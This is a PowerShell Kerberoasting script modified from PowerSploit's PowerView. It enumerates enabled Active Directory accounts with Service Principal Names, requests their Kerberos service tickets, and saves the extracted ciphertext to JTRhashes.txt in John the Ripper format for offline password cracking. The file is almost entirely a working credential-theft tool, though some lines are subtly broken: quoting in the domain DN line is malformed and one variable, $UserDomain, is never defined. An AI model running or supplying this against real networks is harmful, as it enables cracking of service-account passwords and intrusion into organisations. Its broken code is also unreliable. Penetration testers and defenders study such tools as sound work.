<#
    .SYNOPSIS
    Retrieves password hashes from enabled Active Directory User Objects with Service Principal Names (SPNs).
    Modified from the Get-DomainSPNTicket function in https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
    
    .DESCRIPTION
    Retrieves password hashes from enabled Active Directory User Objects with Service Principal Names (SPNs). Converts the hash into a format that is crackable by John the Ripper (JTR).
    Outputs results to screen and saves the results to file. The saved file is already compatible with JTR and can be provided to JTR on the command line without needing changing. 

    .EXAMPLE
    PS C:\> .\Get-Kerberoasting.ps1  
    
    .NOTES
    Version     : 1.0.0
    Last Updated: 26 January 2023
#>

BEGIN {

    $Null = [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel')

    $Domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
    $DomainName = $Domain.Name
    $DomainDN = "LDAP://" + "DC=$($DomainName.replace(".", "",DC="))"

    $searcher = New-Object System.DirectoryServices.DirectorySearcher
    $searcher.SearchRoot = $DomainDN
    # Filter only enabled user objects which have a SPN. 
    $searcher.Filter = "(&(objectCategory=Person)(objectClass=user)(servicePrincipalName=*)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2)))"
    $props = "name", "sAMAccountname", "servicePrincipalName", "Description"

    $list = @()
    foreach ($item in $props) {
        $searcher.PropertiesToLoad.Add($item) | out-null
        $all = $searcher.findall()
    }

    foreach ($user in $all.properties) {
        $obj = New-Object PSObject
        $obj | Add-Member -MemberType NoteProperty -name "name" -Value $user.name
        $obj | Add-Member -MemberType NoteProperty -name "samaccountname" -Value $user.samaccountname
        $obj | Add-Member -MemberType NoteProperty -name "description" -Value $user.description
        $obj | Add-Member -MemberType NoteProperty -name "serviceprincipalname" -Value $user.serviceprincipalname
        $list += $obj
    }
}

PROCESS {
    ForEach ($User in $list) {
        $SamAccountName = $user.samaccountname
        $UserSPN = $user.serviceprincipalname
        $name = $user.name
        $description = $user.description

        try {
            $Ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $UserSPN
        }
        catch {
            Write-Warning "[Get-Kerberoasting] Error requesting ticket for SPN '$UserSPN' from user '$SamAccountName' : $_"
        }
        if ($Ticket) {
            $TicketByteStream = $Ticket.GetRequest()
        }
        if ($TicketByteStream) {
            $Out = New-Object PSObject
            $Out | Add-Member Noteproperty 'name' $name
            $Out | Add-Member Noteproperty 'SamAccountName' $SamAccountName
            $Out | Add-Member Noteproperty 'description' $description
            $Out | Add-Member Noteproperty 'ServicePrincipalName' $Ticket.ServicePrincipalName

            $TicketHexStream = [System.BitConverter]::ToString($TicketByteStream) -replace '-'

            # TicketHexStream == GSS-API Frame (see https://tools.ietf.org/html/rfc4121#section-4.1)
            if ($TicketHexStream -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
                $Etype = [Convert]::ToByte($Matches.EtypeLen, 16)
                $CipherTextLen = [Convert]::ToUInt32($Matches.CipherTextLen, 16) - 4
                $CipherText = $Matches.DataToEnd.Substring(0, $CipherTextLen * 2)

                # Make sure the next field matches the beginning of the KRB_AP_REQ.Authenticator object
                if ($Matches.DataToEnd.Substring($CipherTextLen * 2, 4) -ne 'A482') {
                    Write-Warning "Error parsing ciphertext for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                    $Hash = $null
                    $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($TicketByteStream).Replace('-', ''))
                }
                else {
                    $Hash = "$($CipherText.Substring(0,32))`$$($CipherText.Substring(32))"
                }
            }
            else {
                Write-Warning "Unable to parse ticket structure for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                $Hash = $null
                $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($TicketByteStream).Replace('-', ''))
            }

            if ($Hash) {
                $JTRFormat = "`$krb5tgs`$$($Etype)`$*$SamAccountName`$$UserDomain`$$($Ticket.ServicePrincipalName)*`$$Hash"
            }
            $Out | Add-Member Noteproperty 'Hash' $JTRFormat

        }
        $Out | format-list
        $HashFile = "$SamAccountName" + ":" + "$JTRFormat"
        $HashFile | Out-File .\JTRhashes.txt -Append -Encoding UTF8
    }
}
END {
}